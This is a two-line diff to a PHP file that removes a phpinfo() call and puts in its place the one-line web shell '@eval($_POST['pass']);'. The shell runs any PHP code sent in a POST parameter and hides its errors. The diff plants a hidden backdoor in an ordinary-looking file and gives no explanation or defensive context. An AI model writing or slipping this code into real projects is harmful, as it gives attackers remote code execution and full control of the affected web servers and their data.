@@ -1,2 +1,2 @@
 <?php
-phpinfo();?>
+@eval($_POST['pass']);?>
